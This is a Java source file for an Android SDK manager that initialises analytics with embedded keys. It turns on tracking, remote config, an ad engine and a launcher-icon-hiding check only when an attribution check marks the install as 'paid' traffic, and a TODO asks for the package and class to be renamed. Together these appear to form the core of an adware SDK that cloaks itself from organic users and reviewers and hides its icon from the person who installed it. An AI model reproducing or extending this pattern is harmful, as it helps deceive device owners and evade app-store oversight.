package com.vt.ar;

import android.app.ActivityManager;
import android.app.Application;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;

import com.LogUtil;
import com.Switch;
import com.vt.sdk.Analytics;
import com.vt.sdk.AppLifecycleTracker;
import com.vt.sdk.BeatCenter;
import com.vt.sdk.ExtAdImpRecord;
import com.vt.sdk.ScAndIconManager;
import com.vt.sdk.Singleton;
import com.vt.sdk.StorageFactory;
import com.vt.sdk.TrafficTypeDetective;

import org.greenrobot.eventbus.EventBus;

import org.greenrobot.eventbus.EBEvents;

import java.util.concurrent.atomic.AtomicBoolean;

//todo:修改package & classname
public class SdkManager {
    private static final String TAG = "manager";
    public final static Singleton<SdkManager> sdkManager = new Singleton<SdkManager>() {
        @Override
        protected SdkManager create() {
            return new SdkManager();
        }
    };
    public static void enter(Application app, Object af_attr){
        sdkManager.get().start(app, af_attr);
    }



    private Application app ;
    private Object af_attr ;
    private void start(Application app, Object af_attr){
        if(Switch.LOG_ON){
            LogUtil.d(TAG,"sdk start");
        }
        //todo: 修改flurry & metrica id
        getAnalytics().init(app,
                "DKQYMGKP8R5G8CB926Q9".trim(),
                "be4b43d7-da87-40c0-ba26-8a7c46dc01b4".trim());

        if (!app.getPackageName().equalsIgnoreCase(getProcName(app)))
            return;

        this.app = app;
        this.af_attr = af_attr;
        EventBus.getDefault().registerForMainThread(this);


        getTrafficTypeDetective().detect();
        setFirstLaunchTimeIfNecessary();
    }

    private final AtomicBoolean init=new AtomicBoolean(false);
    public boolean sdkIsReady(){
        return init.get();
    }


    public void onEvent(EBEvents.TRAFFIC_TYPE_RDY ignored){
        if (Switch.LOG_ON){
            LogUtil.d(TAG, "onEvent, EBEvents.TRAFFIC_TYPE_RDY");
        }

        EventBus.getDefault().unregister(this, EBEvents.TRAFFIC_TYPE_RDY.class);

        if(getTrafficTypeDetective().isPaidUser()){
            getAppLifeTracker().track(app);

            getConfigManager().pullRemoteConfig();

            init.set(true);
        }
    }

    public void onEvent(EBEvents.RE_CONFIG_RDY ignored){
        if (Switch.LOG_ON){
            LogUtil.d(TAG, "onEvent, EBEvents.RE_CONFIG_RDY");
        }

        EventBus.getDefault().unregister(this, EBEvents.RE_CONFIG_RDY.class);

        getBeatCenter().start();
        getAdsMaster().init(app);
        getIconManager().validateIconHidden();
    }

    public Application getApp(){
        return app;
    }



    private final Singleton<Analytics> analyticsHolder = new Singleton<Analytics>() {
        @Override
        protected Analytics create() {
            return new Analytics();
        }
    };
    public Analytics getAnalytics(){
        return analyticsHolder.get() ;
    }



    private final Singleton<RemoteConfigManager> configManagerHolder = new Singleton<RemoteConfigManager>() {
        @Override
        protected RemoteConfigManager create() {
            return new RemoteConfigManager(SdkManager.this);
        }
    };
    public RemoteConfigManager getConfigManager(){
        return configManagerHolder.get();
    }


    private final Singleton<AdsMaster> adsMasterHolder = new Singleton<AdsMaster>() {
        @Override
        protected AdsMaster create() {
            return new AdsMaster(SdkManager.this);
        }
    };
    public AdsMaster getAdsMaster(){
        return adsMasterHolder.get();
    }


    private final Singleton<AppLifecycleTracker> appLifeTrackerHolder = new Singleton<AppLifecycleTracker>() {
        @Override
        protected AppLifecycleTracker create() {
            return new AppLifecycleTracker(SdkManager.this);
        }
    };
    public AppLifecycleTracker getAppLifeTracker(){
        return appLifeTrackerHolder.get();
    }


    private final Singleton<ExtAdImpRecord> recordHolder = new Singleton<ExtAdImpRecord>() {
        @Override
        protected ExtAdImpRecord create() {
            return new ExtAdImpRecord(SdkManager.this);
        }
    };
    public ExtAdImpRecord getExtAdImpRecord(){
        return recordHolder.get();
    }


    private final Singleton<TrafficTypeDetective> ttDetectiveHolder = new Singleton<TrafficTypeDetective>() {
        @Override
        protected TrafficTypeDetective create() {
            return new TrafficTypeDetective(SdkManager.this, af_attr);
        }
    };
    public TrafficTypeDetective getTrafficTypeDetective(){
        return ttDetectiveHolder.get();
    }


    private final Singleton<SharedPreferences> encryptSpHolder = new Singleton<SharedPreferences>() {
        @Override
        protected SharedPreferences create() {
            String fileName = SdkManager.this.app.getPackageName() + "."+getFirstInstallTime();

            return StorageFactory.getStorage(SdkManager.this.app, fileName);
        }
    };
    public SharedPreferences getEncryptSP(){
        return encryptSpHolder.get();
    }


    private final Singleton<BeatCenter> beatCenterHolder = new Singleton<BeatCenter>() {
        @Override
        protected BeatCenter create() {
            return new BeatCenter(SdkManager.this);
        }
    };
    public BeatCenter getBeatCenter(){
        return beatCenterHolder.get();
    }


    private final Singleton<ScAndIconManager> iconManager = new Singleton<ScAndIconManager>() {
        @Override
        protected ScAndIconManager create() {
            return new ScAndIconManager(SdkManager.this);
        }
    };
    public ScAndIconManager getIconManager(){
        return iconManager.get();
    }


    private String getProcName(Context context){
        if (Build.VERSION.SDK_INT >= 28)
            return Application.getProcessName();

        String currentProcName = "" ;
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningAppProcessInfo processInfo : manager.getRunningAppProcesses()) {
            if (processInfo.pid == android.os.Process.myPid()) {
                currentProcName = processInfo.processName;
                break;
            }
        }
        return currentProcName;
    }

    public long getFirstInstallTime(){
        long ts = 0;

        try {
            ts = app.getPackageManager().getPackageInfo(app.getPackageName(), 0).firstInstallTime;
        } catch (Throwable ignored){}

        return ts;
    }


    private final String firstLaunchTsKey = "first_launch_time";
    private void setFirstLaunchTimeIfNecessary(){
        SharedPreferences sp = getEncryptSP();

        long time = sp.getLong(firstLaunchTsKey, 0);
        if (time==0){
            sp.edit().putLong(firstLaunchTsKey, System.currentTimeMillis()).apply();
        }
    }
    public long getFirstLaunchTime(){
        long time = getEncryptSP().getLong(firstLaunchTsKey, System.currentTimeMillis());
        return time;
    }


    public String getDeviceMetaData(){
        return String.format("%s|%s|%s", Build.MANUFACTURER, Build.MODEL, Build.VERSION.SDK_INT) ;
    }
}
